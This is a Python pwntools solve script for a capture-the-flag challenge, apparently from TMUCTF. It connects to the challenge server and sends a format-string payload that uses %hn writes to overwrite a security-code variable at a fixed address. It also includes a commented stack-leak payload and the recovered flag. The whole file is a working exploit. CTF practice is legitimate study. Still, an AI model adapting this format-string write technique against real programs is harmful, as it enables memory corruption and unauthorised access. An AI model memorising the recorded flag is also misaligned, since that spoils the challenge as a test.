from pwn import *

DEBUG = False

if DEBUG:
    r = process("./securitycode")
    gdb.attach(r)
else:
    r = remote("185.235.41.205", 7040)

print(r.recv())
r.sendline("A")
print(r.recv())

sec_addr = 0x0804C03C
seccode1 = 0xABAD
seccode2 = 0xCAFE
payload = p32(sec_addr) + p32(sec_addr + 2) + "%"+str(seccode1-8)+"x%16$hn" + "%"+str(seccode2-seccode1)+"x%15$hn"
r.sendline(payload)
print(r.recv())

# payload2 = "%7$x"
# r.sendline(payload2)
# Redo this multiple times from 7->21 to get flag

r.interactive()

# flag: TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf7e11340}